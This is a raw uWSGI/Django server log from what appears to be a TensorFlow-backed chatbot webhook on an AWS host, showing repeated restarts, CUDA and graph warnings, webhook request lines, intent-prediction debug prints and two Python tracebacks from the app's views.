*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56485a3a9cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56485a3a9cf0 pid: 2131 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2131, cores: 1)
2020-09-04 06:10:30.266311: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:10:30.266347: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:10:48.255498: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:10:48.255528: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:10:48.255545: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:10:48.255763: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:10:48.304175: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:10:48.304621: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56485f29bf50 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:10:48.304650: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:10:48.748493: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:10:48.749943: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:10:48.751402: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2131|app: 0|req: 1/1] 203.249.39.177 () {52 vars in 880 bytes} [Fri Sep  4 06:10:28 2020] GET / => generated 1365 bytes in 21127 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 2131|app: 0|req: 2/2] 203.249.39.177 () {48 vars in 767 bytes} [Fri Sep  4 06:10:49 2020] GET /favicon.ico => generated 2328 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 2131|app: 0|req: 3/3] 203.249.39.177 () {52 vars in 902 bytes} [Fri Sep  4 06:10:50 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 2131|app: 0|req: 4/4] 203.249.39.177 () {52 vars in 904 bytes} [Fri Sep  4 06:10:50 2020] GET /chat/ => generated 1476 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2131|app: 0|req: 5/5] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:10:57 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-04 06:10:58.447139: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-04 06:10:58.784259: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:10:58.785752: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:10:58.787176: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

[pid: 2131|app: 0|req: 6/6] 66.102.6.203 () {42 vars in 542 bytes} [Fri Sep  4 06:10:57 2020] POST /webhook/ => generated 104 bytes in 1206 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2131|app: 0|req: 7/7] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:10:59 2020] POST /webhook/ => generated 104 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2131|app: 0|req: 8/8] 66.102.6.203 () {42 vars in 542 bytes} [Fri Sep  4 06:12:48 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2131|app: 0|req: 9/9] 66.102.6.203 () {42 vars in 542 bytes} [Fri Sep  4 06:12:48 2020] POST /webhook/ => generated 104 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2131|app: 0|req: 10/10] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:12:49 2020] POST /webhook/ => generated 104 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:13:08 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55cbf1210cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55cbf1210cf0 pid: 2380 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2380, cores: 1)
2020-09-04 06:13:17.033068: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:13:17.033103: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:13:25.433785: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:13:25.433819: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:13:25.433834: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:13:25.434045: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:13:25.460185: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:13:25.460541: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55cbf61040a0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:13:25.460560: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:13:25.747345: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:13:25.748801: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:13:25.750156: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2380|app: 0|req: 1/1] 66.249.83.45 () {42 vars in 542 bytes} [Fri Sep  4 06:13:16 2020] POST /webhook/ => generated 184 bytes in 9369 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2380|app: 0|req: 2/2] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:13:25 2020] POST /webhook/ => generated 184 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2380|app: 0|req: 3/3] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:13:39 2020] POST /webhook/ => generated 184 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2380|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 542 bytes} [Fri Sep  4 06:18:07 2020] POST /webhook/ => generated 184 bytes in 8 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:20:11 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55c24e595cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55c24e595cf0 pid: 2472 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2472, cores: 1)
2020-09-04 06:20:32.126890: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:20:32.126924: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:20:40.577885: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:20:40.577917: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:20:40.577934: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:20:40.578146: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:20:40.604184: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:20:40.604577: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55c253480c50 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:20:40.604596: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:20:40.891919: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:20:40.893372: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:20:40.894731: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2472|app: 0|req: 1/1] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:20:31 2020] POST /webhook/ => generated 181 bytes in 9418 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2472|app: 0|req: 2/2] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:20:44 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-04 06:20:45.990711: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-04 06:20:46.291726: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:20:46.293210: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:20:46.294608: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 2472|app: 0|req: 3/3] 66.249.83.45 () {42 vars in 542 bytes} [Fri Sep  4 06:20:45 2020] POST /webhook/ => generated 49747 bytes in 1123 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:22:37 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5574ba4a3cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5574ba4a3cf0 pid: 2554 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2554, cores: 1)
2020-09-04 06:23:10.354110: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:23:10.354146: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:23:18.666621: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:23:18.666652: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:23:18.666668: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:23:18.666883: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:23:18.692184: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:23:18.692577: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5574bf397420 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:23:18.692593: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:23:18.976947: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:23:18.978343: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:23:18.979697: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2554|app: 0|req: 1/1] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:23:09 2020] POST /webhook/ => generated 181 bytes in 9271 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2554|app: 0|req: 2/2] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 06:23:19 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-04 06:23:20.513194: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-04 06:23:20.815039: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:23:20.816544: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:23:20.817950: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 46, in webhook
    return chatting(queryText)
  File "./haniumapp/views.py", line 77, in chatting
    return JsonResponse(response, safe=False)
UnboundLocalError: local variable 'response' referenced before assignment
[pid: 2554|app: 0|req: 3/3] 66.102.6.203 () {42 vars in 542 bytes} [Fri Sep  4 06:23:19 2020] POST /webhook/ => generated 68351 bytes in 1109 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:25:01 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5573e6ad6cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5573e6ad6cf0 pid: 2630 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2630, cores: 1)
2020-09-04 06:25:29.119141: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:25:29.119177: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:25:37.433732: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:25:37.433764: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:25:37.433779: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:25:37.433994: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:25:37.460199: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:25:37.460598: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5573eb9d24c0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:25:37.460617: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:25:37.747533: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:25:37.748974: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:25:37.750325: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
